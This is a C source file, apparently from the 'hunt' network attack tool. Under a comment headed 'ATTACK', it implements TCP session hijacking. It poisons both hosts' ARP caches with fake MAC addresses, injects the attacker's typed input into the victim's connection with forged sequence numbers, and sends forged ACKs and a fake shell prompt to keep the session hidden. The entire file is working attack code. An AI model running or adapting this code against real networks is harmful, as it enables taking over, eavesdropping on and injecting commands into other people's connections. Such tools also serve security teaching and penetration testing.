/*
 *
 *	This is free software. You can redistribute it and/or modify under
 *	the terms of the GNU General Public License version 2.
 *
 * 	Copyright (C) 1998 by kra
 *
 */
#include "hunt.h"
#include <sys/time.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include "c/list.h"

/*
 * 
 * 
 * ATTACK
 * 
 *
 */

int user_arp_hijack(struct user_conn_info *uci, char *src_fake_mac,
		    char *dst_fake_mac, int input_mode)
{
	struct conn_info *ci;
	int retval;
	
	if (!(ci = conn_get(uci))) {
		printf("connection isn't available\n");
		retval = 1;
	} else {
		retval = arp_hijack(ci, src_fake_mac, dst_fake_mac, input_mode);
		conn_free(ci);
	}
	return retval;
}

/*
 * use l_hijack_conn list
 */

struct watch_tty_data {
	char *src_fake_mac;
	struct conn_info *ci;
	int input_mode;
};

static void *watch_tty(struct watch_tty_data *wtd)
{
	struct tcp_spec ts;
	char buf[256];
	int nr;

	if (wtd->input_mode == INPUT_MODE_RAW)
		tty_raw(0, 1, 0);
	while ((nr = read(0, buf, sizeof(buf)))) {
		if (buf[0] == 29)	/* ^] */
			break;
		if (wtd->input_mode == INPUT_MODE_LINEECHO || 
		    wtd->input_mode == INPUT_MODE_LINEECHOR) {
			if (nr >= 3 && buf[0] == '^' && buf[1] == ']' && 
			    buf[2] == '\n')
				break;
			
			if (wtd->input_mode == INPUT_MODE_LINEECHOR && 
			    nr < sizeof(buf) && buf[nr - 1] == '\n') {
				buf[nr - 1] = '\r';
				buf[nr++] = '\n';
			}
		}
		memset(&ts, 0, sizeof(ts));
		ts.saddr = wtd->ci->src_addr;
		ts.daddr = wtd->ci->dst_addr;
		ts.sport = wtd->ci->src_port;
		ts.dport = wtd->ci->dst_port;
		ts.src_mac = wtd->src_fake_mac;
		ts.dst_mac = wtd->ci->dst.src_mac;
		ts.seq = wtd->ci->dst.next_d_seq;
		ts.ack_seq = wtd->ci->dst.next_seq;
		ts.window = wtd->ci->src.window ? wtd->ci->src.window : htons(242);
		ts.id = htons(ntohs(wtd->ci->src.id) + 1);
		ts.ack = 1;
		ts.psh = 1;
		ts.rst = 0;
		ts.data = buf;
		ts.data_len = nr;
		send_tcp_packet(&ts);
	}
	if (wtd->input_mode == INPUT_MODE_RAW)
		tty_reset(0);
	list_produce_done(&l_hijack_conn);
	return NULL;
}

static struct arp_spoof_info *asi_src; /* src in dst host */
static struct arp_spoof_info *asi_dst; /* dst in src host */
static struct arp_dont_relay *dont_relay;

int arp_hijack(struct conn_info *ci, char *src_fake_mac, char *dst_fake_mac,
	       int input_mode)
{
	struct iphdr *iph;
	struct tcphdr *tcph;
	struct tcp_spec ts;
	struct ifunc_item ifunc_dst, ifunc_src;
	struct packet *p;
	int count_dst = 0, count_src = 0;
	pthread_t thr_tty;
	struct watch_tty_data wtd;

	asi_src = asi_dst = NULL;
	
	dont_relay = arp_dont_relay_insert(ci->src_addr, ci->dst_addr,
	 	 		           ci->src_port, ci->dst_port);
	if (src_fake_mac) {
		if (!(asi_src = start_arp_spoof(ci->src_addr, ci->dst_addr, NULL, NULL, NULL, 0, 0, 0))) {
			asi_src = start_arp_spoof(ci->src_addr, ci->dst_addr,
			  		      ci->src.src_mac, ci->dst.src_mac,
					      src_fake_mac, 0, 0, 0);
		}
	} else
		asi_src = get_arp_spoof(ci->src_addr, ci->dst_addr);
	if (asi_src && user_arpspoof_test(asi_src)) {
		if (user_run_arpspoof_until_successed(asi_src)) {
			set_tty_color(COLOR_BRIGHTRED);
			printf("ARP spoof of %s in host %s FAILED\n",
			       host_lookup(asi_src->src_addr, hl_mode),
			       host_lookup(asi_src->dst_addr, hl_mode));
			set_tty_color(COLOR_LIGHTGRAY);
			fflush(stdout);
			if (src_fake_mac)
				stop_arp_spoof(asi_src);
			asi_src = NULL;
		}
	}
	if (dst_fake_mac) {
		if (!(asi_dst = start_arp_spoof(ci->dst_addr, ci->src_addr, NULL, NULL, NULL, 0, 0, 0))) {
			asi_dst = start_arp_spoof(ci->dst_addr, ci->src_addr,
					      ci->dst.src_mac, ci->src.src_mac,
					      dst_fake_mac, 0, 0, 0);
		}
	} else
		asi_dst = get_arp_spoof(ci->dst_addr, ci->src_addr);
	
	if (asi_dst && user_arpspoof_test(asi_dst)) {
		if (user_run_arpspoof_until_successed(asi_dst)) {
			set_tty_color(COLOR_BRIGHTRED);
			printf("ARP spoof of %s in host %s FAILED\n",
			       host_lookup(asi_dst->src_addr, hl_mode),
			       host_lookup(asi_dst->dst_addr, hl_mode));
			set_tty_color(COLOR_LIGHTGRAY);
			fflush(stdout);
			if (dst_fake_mac)
				stop_arp_spoof(asi_dst);
			asi_dst = NULL;
		}
	}
	set_tty_color(COLOR_WHITE);
	printf("you took over the connection\n");
	set_tty_color(COLOR_BRIGHTRED);
	printf("CTRL-] to break\n");
	set_tty_color(COLOR_LIGHTGRAY);
	fflush(stdout);

	wtd.src_fake_mac = asi_src ? asi_src->src_fake_mac : ci->src.src_mac;
	wtd.ci = ci;
	wtd.input_mode = input_mode;
	
	list_produce_start(&l_hijack_conn);
	pthread_create(&thr_tty, NULL, (void *(*)(void *)) watch_tty, &wtd);
	
	ifunc_dst.func = (void(*)(struct packet *, void *)) func_hijack_dst;
	ifunc_dst.arg = ci;
	list_enqueue(&l_ifunc_tcp, &ifunc_dst);
	ifunc_src.func = (void(*)(struct packet *, void *)) func_hijack_src;
	ifunc_src.arg = ci;
	list_enqueue(&l_ifunc_tcp, &ifunc_src);
	
	while ((p = list_consume(&l_hijack_conn, NULL))) {
		iph = p->p_iph;
		tcph = p->p_hdr.p_tcph;
		if (iph->saddr == ci->dst_addr &&
		    iph->daddr == ci->src_addr &&
		    tcph->source == ci->dst_port &&
		    tcph->dest == ci->src_port) {
			/* packet from dest */
			if (p->p_data_len) {
				print_data_packet(p, p->p_data_len, ++count_dst, 1);
				packet_free(p);
				/* send ACK */
				memset(&ts, 0, sizeof(ts));
				ts.saddr = ci->src_addr;
				ts.daddr = ci->dst_addr;
				ts.sport = ci->src_port;
				ts.dport = ci->dst_port;
				ts.src_mac = asi_src ? asi_src->src_fake_mac :
						ci->src.src_mac;
				ts.dst_mac = ci->dst.src_mac;
				ts.seq = ci->dst.next_d_seq;
				ts.ack_seq = ci->dst.next_seq;
				ts.window = ci->src.window ? ci->src.window : htons(242);
				ts.id = htons(ntohs(ci->src.id) + 1);
				ts.ack = 1;
				ts.psh = 1;
				ts.rst = 0;
				ts.data = NULL;
				ts.data_len = 0;
				send_tcp_packet(&ts);
			} else
				packet_free(p);
		} else {
			if (p->p_data_len) {
				/* packet from source */
				print_data_packet(p, p->p_data_len, ++count_src, 0);
				memset(&ts, 0, sizeof(ts));
				ts.saddr = ci->dst_addr;
				ts.daddr = ci->src_addr;
				ts.sport = ci->dst_port;
				ts.dport = ci->src_port;
				ts.src_mac = asi_dst ? asi_dst->src_fake_mac : 
							ci->dst.src_mac;
				ts.dst_mac = ci->src.src_mac;
				ts.seq = ci->src.next_d_seq;
				ts.ack_seq = ci->src.next_seq;
				ts.window = ci->dst.window ? ci->dst.window : 
							htons(242);
				ts.id = htons(ntohs(ci->dst.id) + 1);
				ts.ack = 1;
				ts.psh = 1;
				ts.rst = 0;
				if (p->p_data[0] == '\r' || p->p_data[0] == '\n') {
					ts.data = "\r\n$ ";
					ts.data_len = 4;
				} else {
					ts.data = p->p_data;
					ts.data_len = p->p_data_len;
				}
				send_tcp_packet(&ts);
			}
			packet_free(p);
		}
	}
	list_remove(&l_ifunc_tcp, &ifunc_dst);
	list_remove(&l_ifunc_tcp, &ifunc_src);
	packet_flush(&l_hijack_conn);
	pthread_join(thr_tty, NULL);

	return 0;
}


void user_arp_hijack_done(char *src_fake_mac, char *dst_fake_mac)
{
	arp_hijack_done(src_fake_mac, dst_fake_mac);
}

void arp_hijack_done(char *src_fake_mac, char *dst_fake_mac)
{
	arp_dont_relay_remove(dont_relay);
	if (asi_src && src_fake_mac) {
		stop_arp_spoof(asi_src);
	}
	asi_src = NULL;
	if (asi_dst && dst_fake_mac) {
		stop_arp_spoof(asi_dst);
	}
	asi_dst = NULL;
}
